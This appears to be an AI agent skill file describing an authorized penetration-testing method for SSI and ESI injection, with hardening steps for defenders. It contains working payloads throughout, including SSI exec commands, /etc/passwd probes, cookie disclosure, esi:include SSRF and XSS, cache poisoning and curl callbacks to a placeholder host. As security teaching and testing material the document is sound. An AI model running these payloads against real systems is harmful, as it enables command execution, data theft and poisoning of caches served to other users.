---
name: offensive-ssi
description: "Authorized-assessment methodology for Server-Side Include (SSI) and Edge Side Include (ESI) injection. You use this skill when a target reflects attacker-controlled input into pages parsed by an SSI-enabled web server (Apache mod_include, nginx SSI, lighttpd) or into fragments processed by an ESI-capable cache or CDN (Varnish, Squid, Akamai, Fastly, Oracle/Weblogic). It covers classic SSI directives (echo, exec, include, fsize, config), ESI primitives (<esi:include>, <esi:vars>, <esi:inline>, Surrogate-Control negotiation), host-header and cache-key confusion, blind and out-of-band detection, and safe proof-of-concept payloads. It uses only example.com and 192.0.2.0/24, never real victim domains or credentials, and maps every finding to CWE-97, CWE-94, and OWASP guidance so defenders can disable SSI exec, stop reflecting input into ESI, and strip client Surrogate-Control."
---

# Server-Side Include and Edge Side Include Injection

You use this skill during an authorized security assessment when a web
application or its caching layer parses markup that you can influence. Two
distinct but related classes of bug live here:

- **Server-Side Includes (SSI):** directives like `<!--#echo -->` and
  `<!--#exec -->` interpreted by the origin web server (Apache `mod_include`,
  nginx `ssi on;`, lighttpd `mod_ssi`) before the response leaves the box. A
  reflected directive can leak server variables, read files, or run commands.
- **Edge Side Include (ESI):** an XML-ish markup (`<esi:include>`,
  `<esi:vars>`) processed by a reverse proxy, cache, or CDN (Varnish, Squid,
  Akamai, Fastly, some Oracle/WebLogic stacks). The origin emits ESI tags; the
  edge expands them. If attacker input survives into an ESI-parsed fragment,
  you get server-side request forgery, cache poisoning, and sometimes raw
  HTML/JS injection that bypasses origin output encoding.

Both map to **CWE-97: Improper Neutralization of Server-Side Includes** and
the broader **CWE-94: Improper Control of Generation of Code ("Code
Injection")**. The modern ESI attack surface was systematized by Louis
Dion-Marcil (GoSecure) in the 2018 "Beyond XSS: Edge Side Include Injection"
research presented at Black Hat USA 2018 / DEF CON, which this skill follows.

**Scope discipline.** Everything below uses the documentation-reserved domain
`example.com` and the reserved test range `192.0.2.0/24` (RFC 5737). Never
substitute a real victim domain, real internal host, or real credential into a
payload you actually send. Confirm the target and the exact hosts, caches, and
CDNs that are in scope **in writing** before you test. SSI `exec` and ESI
`include` can execute commands and reach internal networks; treat them as
high-impact and get explicit authorization.

## Quick Workflow

You move from "is this parsed?" to "what can I prove?" in a fixed order. Stop
at the least-invasive step that demonstrates the finding.

1. **Map the stack.** Identify the origin server (`Server:` header, error
   pages, file extensions `.shtml`/`.shtm`/`.stm`) and any edge in front of it
   (`Via:`, `X-Cache:`, `X-Served-By:`, `Age:`, `X-Varnish:`,
   `X-Cache-Hits:`). SSI lives at the origin; ESI lives at the edge.
2. **Find reflection sinks.** Enumerate every place your input appears in a
   response body: query params, path segments, headers reflected into pages
   (`Referer`, `User-Agent`, `X-Forwarded-Host`), error messages, search
   results, and cached variants.
3. **Fingerprint the parser.** Send a benign marker and watch whether the
   server *consumes* your markup instead of echoing it verbatim. For SSI, an
   un-echoed `<!--#echo var="DATE_LOCAL" -->` that turns into a date means the
   directive ran. For ESI, an `<esi:vars>` that disappears or expands means an
   ESI processor is active.
4. **Prove low-impact first.** Use variable echo (`DATE_LOCAL`,
   `DOCUMENT_NAME`) or `<esi:vars>$(HTTP_HOST)` before touching anything that
   reads files, runs commands, or makes requests.
5. **Escalate deliberately.** Only after a confirmed, authorized finding do you
   test `include`/`fsize` (file disclosure), `exec` (command execution), or
   `<esi:include src=...>` to an in-scope collaborator host in `192.0.2.0/24`.
6. **Capture evidence.** Record the exact request, the raw response, timestamps,
   and (for blind cases) your out-of-band listener logs. Screenshot cache
   headers that prove a poisoned entry was served to a second request.
7. **Clean up.** If you poisoned a cache, request a purge or wait out the TTL,
   and tell the client which cache keys were affected.

```http
GET /search?q=marker_7f3a HTTP/1.1
Host: example.com
```

If `marker_7f3a` comes back inside HTML that the server also parses for SSI or
ESI, that sink is your candidate. Swap the marker for the fingerprint payloads
below.

## SSI Directive Injection

Server-Side Includes are directives embedded in HTML comments. When
`mod_include` (Apache) or an equivalent is enabled for the document being
served, the server evaluates them server-side. The canonical trigger is when
user input is written into a page whose content type / handler is SSI-parsed.

### When SSI fires

SSI is typically enabled per-directory or per-extension:

```apache
# Apache: SSI enabled for .shtml, and dangerously for .html
Options +Includes
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml .html
```

The riskiest misconfiguration is `Options +Includes` combined with
`AddOutputFilter INCLUDES .html`, because every reflected value in an ordinary
`.html` response becomes a potential directive. `IncludesNOEXEC` allows
`include`/`echo` but blocks `exec`; its presence changes what you can prove.

### Fingerprinting SSI

Send a directive that produces an unmistakable, benign transformation:

```html
<!--#echo var="DATE_LOCAL" -->
```

If the response contains a formatted date where your input was, SSI is live.
Other safe probes:

```html
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#printenv -->
```

`DATE_LOCAL` and `DOCUMENT_NAME` leak nothing sensitive. `printenv` can dump
the full CGI environment (including secrets in some setups), so treat it as
escalation, not fingerprinting, unless the engagement allows it.

### `echo` — variable disclosure

`echo` reflects SSI/CGI environment variables. Beyond fingerprinting, it can
leak internal paths and configuration:

```html
<!--#echo var="SERVER_SOFTWARE" -->
<!--#echo var="SERVER_ADDR" -->
<!--#echo var="HTTP_COOKIE" -->
```

`HTTP_COOKIE` reflection can turn into a session-stealing primitive if the page
is viewed by another user and you can influence the stored input (stored SSI).
Note that and move on; you have shown impact.

### `include` — file and virtual include

`include` pulls another resource into the page, either by filesystem path
(`file`) or by URL path on the same server (`virtual`):

```html
<!--#include file="secret.txt" -->
<!--#include virtual="/includes/config.inc" -->
```

`virtual` is often the more powerful of the two because it is evaluated through
the web server's URL space and can reach handlers (CGI scripts, internal
endpoints) that `file` cannot. Use a known-innocuous include target first
(for example a public footer) to prove the primitive before reading anything
sensitive. For a POC, including a file you are authorized to read and showing
one distinctive line is enough.

### `fsize` and `flastmod` — blind oracle

When output is not directly reflected, `fsize` and `flastmod` give you a blind
file-existence and metadata oracle:

```html
<!--#fsize file="/etc/passwd" -->
<!--#flastmod file="/var/www/html/index.html" -->
```

A numeric size or a timestamp for a guessed path confirms existence without you
reading contents. An error (or `[an error occurred ...]`) implies the path is
missing or unreadable. This is useful for mapping a filesystem during a blind
assessment with minimal footprint.

### `exec` — command execution

`exec` is the high-impact directive. `cmd` runs a shell command; `cgi` runs a
CGI program:

```html
<!--#exec cmd="id" -->
<!--#exec cmd="uname -a" -->
```

Command execution is the most intrusive thing in this skill. Before you send
it:

- Confirm it is in scope for this specific host, in writing.
- Prefer a harmless, non-mutating command (`id`, `whoami`, `hostname`) that
  proves execution without touching data.
- For blind confirmation, trigger an out-of-band callback to a collaborator you
  control inside `192.0.2.0/24` rather than reading data inline:

```html
<!--#exec cmd="curl http://192.0.2.10/ssi-poc-$(hostname)" -->
```

Log the inbound request on `192.0.2.10` as your evidence. Never run
destructive, persistence, or lateral-movement commands as part of a POC.

### Breaking out of an existing context

Reflected input is often inside an attribute or tag. Because SSI directives are
HTML comments, you usually need your payload to land in a position where a raw
`<!--#...-->` comment is parsed. If your input sits inside an attribute value,
close it first:

```html
"><!--#echo var="DATE_LOCAL" -->
```

If filtering strips `<!--`, test encodings and partial filters, but do not
assume a bypass is a vulnerability until the directive actually executes.

## ESI Injection

Edge Side Include is a markup language (W3C note, 2001) that lets an origin
tell a downstream cache to assemble a page from fragments. The processor is the
**edge** (Varnish, Squid, some CDNs, Oracle Traffic Director / WebLogic), not
the origin. ESI injection, as framed by Dion-Marcil's 2018 GoSecure research,
happens when attacker input is reflected by the origin and then parsed as ESI
by the edge — so origin-side output encoding (which stops classic XSS) does not
help, because the dangerous expansion happens *after* the origin.

### Detecting an ESI processor

You cannot read the edge config, so you infer ESI support behaviorally. First,
look at headers that reveal a surrogate:

```http
Surrogate-Control: content="ESI/1.0"
Via: 1.1 varnish
X-Cache: HIT
X-Served-By: cache-xxx
```

Then send a self-contained probe and watch whether the tag is *evaluated* and
*stripped*:

```html
<esi:vars>Marker-$(HTTP_HOST)</esi:vars>
```

Three outcomes:

- The tag is returned verbatim → no ESI processing on this path.
- The tag disappears and `Marker-example.com` (or similar) appears → ESI is
  active and expanding variables.
- The tag disappears leaving nothing → ESI is active but that variable is empty
  or stripped; try another primitive.

A comment-based probe also helps, because an ESI processor removes ESI
comments:

```html
<esi:comment text="esi-probe-7f3a" />
```

If `esi-probe-7f3a` is gone from the response, something parsed ESI.

### `<esi:include>` — SSRF and fragment fetch

The flagship primitive. The edge fetches `src` and splices it into the page:

```html
<esi:include src="http://192.0.2.10/poc" />
```

Because the *cache* makes this request, you get server-side request forgery
from the edge's network position — frequently more trusted than the origin.
Point `src` only at a collaborator host you control in `192.0.2.0/24` and
confirm via your listener. Many processors support failover:

```html
<esi:include src="http://192.0.2.10/primary" alt="http://192.0.2.10/backup" />
```

Impact to articulate: internal service access, metadata-endpoint reach on cloud
edges, and fetching attacker-controlled HTML that is then rendered in the
victim's origin — i.e. XSS that bypasses origin encoding.

### `<esi:vars>` — variable disclosure and injection

`<esi:vars>` expands ESI variables, including request-derived ones:

```html
<esi:vars>$(HTTP_USER_AGENT)</esi:vars>
<esi:vars>$(HTTP_COOKIE)</esi:vars>
<esi:vars>$(HTTP_HOST)</esi:vars>
```

`$(HTTP_COOKIE)` can disclose cookies of whoever's request populated the cached
fragment, which combines nastily with cache poisoning. Some processors also let
you reference specific cookies: `$(HTTP_COOKIE{sessionid})`.

### XSS via ESI when origin encoding is in place

This is the key 2018 insight. Suppose the origin HTML-encodes output, so
`<script>` becomes `&lt;script&gt;` and classic XSS fails. If the reflection is
ESI-parsed, you can smuggle markup through an ESI variable or include so the
*edge* emits raw HTML:

```html
<esi:include src="http://192.0.2.10/xss.html" />
```

where `192.0.2.10/xss.html` returns `<script>/* in-scope POC */</script>`. The
edge inlines it unencoded. Demonstrate with a benign, authorized marker (for
example a DOM write of a fixed string), never a real payload against real
users.

### `<esi:inline>` and includes of local fragments

Some engines support inline fragment definitions and name-based includes:

```html
<esi:inline name="/frag/poc" fetchable="yes">injected-fragment</esi:inline>
```

Behavior is engine-specific; use it to show that the processor honors
attacker-defined fragments, which indicates deeper trust in reflected ESI.

### Surrogate-Control and host-header / cache-key confusion

Two cache-layer tricks amplify ESI findings:

- **Client-supplied `Surrogate-Control`.** Some edges honor a
  `Surrogate-Control` request header and will enable ESI processing of a
  response that otherwise wouldn't be parsed. If a client can set it, test:

```http
GET /page HTTP/1.1
Host: example.com
Surrogate-Control: content="ESI/1.0"
```

  If the edge now expands ESI you injected, you have widened the attack surface
  from the client side — and a clear defender action (strip the header).

- **Host-header and unkeyed-input poisoning.** If the cache key omits a header
  that the origin reflects (for example `X-Forwarded-Host`), you can poison a
  cached entry served to others:

```http
GET /page HTTP/1.1
Host: example.com
X-Forwarded-Host: 192.0.2.10
```

  When the reflected header lands in an ESI context, the poisoned fragment is
  cached and replayed. Prove it with two requests: one that plants the entry,
  one from a clean session that receives it (watch for `X-Cache: HIT` and your
  marker). Because this affects other users, get explicit sign-off, keep the
  marker benign, and arrange a purge afterward.

### Chaining ESI with blind detection

When nothing reflects, make the edge talk to you:

```html
<esi:include src="http://192.0.2.10/blind-$(HTTP_HOST)" />
```

A hit on `192.0.2.10` with the expanded host name proves both ESI execution and
SSRF in one shot, without any inline reflection.

## Detection / Defender View

Switch perspective: here is how blue teams find and kill these bugs, which also
tells you what will stop your payloads.

### Finding it as a defender

- **Inventory parsers.** Know every place SSI is enabled (`grep` for
  `Options +Includes`, `AddOutputFilter INCLUDES`, `ssi on;`,
  `IncludesNOEXEC`) and every edge that supports ESI (Varnish VCL `esi = true`
  / `beresp.do_esi`, Squid `esi_parser`, CDN surrogate config).
- **Hunt reflection into parsed content.** Review templates and handlers for
  user input written into `.shtml`/SSI-parsed pages or into responses that
  carry `Surrogate-Control: content="ESI/1.0"`.
- **Log signatures.** Alert on request or response bodies containing
  `<!--#exec`, `<!--#include`, `<esi:include`, `<esi:vars`, and on client
  requests carrying `Surrogate-Control`.

### Fixing SSI

- **Disable `exec`.** Use `Options +IncludesNOEXEC` so `exec cmd`/`exec cgi`
  and CGI `#include virtual` are blocked. Better, turn SSI off entirely where
  it is not needed (`Options -Includes`).
- **Never parse user-reachable extensions.** Do not apply
  `AddOutputFilter INCLUDES` to `.html`; restrict SSI to a controlled directory
  of trusted templates.
- **Encode before reflection.** Any user input that must appear in an
  SSI-parsed page should be neutralized so `<!--#` cannot form (encode `<`, and
  strip or encode the `<!--#` sequence).

```apache
# Safer SSI: allow includes but never exec, and only for .shtml
<Directory "/var/www/html/ssi">
    Options +IncludesNOEXEC
    AddOutputFilterByType INCLUDES text/x-server-parsed-html
</Directory>
```

### Fixing ESI

- **Don't reflect user input into ESI-parsed responses.** Treat any response
  that the edge will ESI-parse as a trusted template; keep attacker-controlled
  bytes out of it.
- **Strip client `Surrogate-Control`.** Edges and origins should remove
  `Surrogate-Control` arriving from clients so attackers can't turn on ESI
  processing:

```nginx
# nginx: drop client-supplied Surrogate-Control before it reaches the edge
proxy_set_header Surrogate-Control "";
```

```varnishcnf
# Varnish VCL: only enable ESI on responses the origin explicitly marks
sub vcl_backend_response {
    if (beresp.http.Surrogate-Control ~ "ESI/1.0") {
        set beresp.do_esi = true;
        unset beresp.http.Surrogate-Control;
    }
}
sub vcl_recv {
    # never trust a client's Surrogate-Control
    unset req.http.Surrogate-Control;
}
```

- **Key the cache on all reflected inputs.** If the origin reflects
  `X-Forwarded-Host` or similar, include it in the cache key or stop reflecting
  it, to prevent poisoning.
- **Restrict `<esi:include>` targets.** Where the processor allows it,
  allow-list the hosts the edge may fetch, blocking link-local/metadata and
  internal ranges.

### Verifying the fix

Re-run your fingerprint probes (`<!--#echo var="DATE_LOCAL" -->`,
`<esi:vars>$(HTTP_HOST)</esi:vars>`, client `Surrogate-Control`). A fixed
system echoes them verbatim and makes no out-of-band request to your
`192.0.2.0/24` listener.

## Engagement Cheatsheet

Fast reference for an authorized test. Replace nothing with real targets.

**Stack fingerprint headers**

| Signal | Meaning |
| --- | --- |
| `Server: Apache` + `.shtml` | Candidate for SSI (`mod_include`) |
| `Via: 1.1 varnish`, `X-Varnish:` | Varnish edge — ESI likely |
| `X-Cache`, `Age`, `X-Served-By` | A cache sits in front — ESI/poisoning |
| `Surrogate-Control: content="ESI/1.0"` | ESI processing announced |

**SSI probes (low → high impact)**

```html
<!--#echo var="DATE_LOCAL" -->              <!-- fingerprint -->
<!--#echo var="SERVER_SOFTWARE" -->         <!-- info leak -->
<!--#fsize file="/etc/passwd" -->           <!-- blind oracle -->
<!--#include virtual="/includes/x.inc" -->  <!-- file read -->
<!--#exec cmd="id" -->                       <!-- RCE, authorize first -->
```

**ESI probes (low → high impact)**

```html
<esi:comment text="probe-7f3a" />                  <!-- fingerprint -->
<esi:vars>$(HTTP_HOST)</esi:vars>                  <!-- var echo -->
<esi:vars>$(HTTP_COOKIE)</esi:vars>                <!-- info leak -->
<esi:include src="http://192.0.2.10/poc" />        <!-- SSRF/XSS -->
```

**Client-side amplifiers**

```http
Surrogate-Control: content="ESI/1.0"
X-Forwarded-Host: 192.0.2.10
```

**Blind confirmation (out-of-band)**

```html
<!--#exec cmd="curl http://192.0.2.10/s-$(hostname)" -->
<esi:include src="http://192.0.2.10/e-$(HTTP_HOST)" />
```

**Rules of engagement**

- Only `example.com` and `192.0.2.0/24` in any payload you actually send.
- Low-impact proof first; `exec` and SSRF only with written sign-off.
- Benign commands and benign markers only — no data destruction, no real-user
  payloads.
- Poisoned a cache? Note the keys, request a purge or wait the TTL, report it.
- Keep raw request/response pairs and listener logs as evidence.

**Severity framing**

| Finding | Typical rating |
| --- | --- |
| SSI `echo` info leak | Medium |
| ESI `<esi:vars>` cookie disclosure | High |
| SSI/ESI file read | High |
| ESI SSRF (`<esi:include>`) | High–Critical |
| SSI `exec` command execution | Critical |
| ESI cache poisoning affecting others | High–Critical |

## Key References

- **CWE-97:** Improper Neutralization of Server-Side Includes (SSI) —
  <https://cwe.mitre.org/data/definitions/97.html>
- **CWE-94:** Improper Control of Generation of Code ("Code Injection") —
  <https://cwe.mitre.org/data/definitions/94.html>
- **OWASP WSTG:** Testing for SSI Injection
  (WSTG-INPV-11) and the ESI injection section — OWASP Web Security Testing
  Guide, <https://owasp.org/www-project-web-security-testing-guide/>
- **OWASP:** Server-Side Includes (SSI) Injection attack reference —
  <https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection>
- **Louis Dion-Marcil / GoSecure (2018):** "Beyond XSS: Edge Side Include
  Injection," Black Hat USA 2018 / DEF CON — foundational ESI injection
  research covering `<esi:include>` SSRF, cache poisoning, and encoding bypass.
- **Apache HTTP Server:** `mod_include` documentation (SSI directives,
  `IncludesNOEXEC`) — <https://httpd.apache.org/docs/current/mod/mod_include.html>
- **W3C:** ESI Language Specification 1.0 (Edge Side Includes, 2001) —
  <https://www.w3.org/TR/esi-lang/>
- **RFC 5737:** IPv4 Address Blocks Reserved for Documentation
  (`192.0.2.0/24`) — <https://www.rfc-editor.org/rfc/rfc5737>
- **RFC 2606:** Reserved Top Level DNS Names (`example.com`) —
  <https://www.rfc-editor.org/rfc/rfc2606>
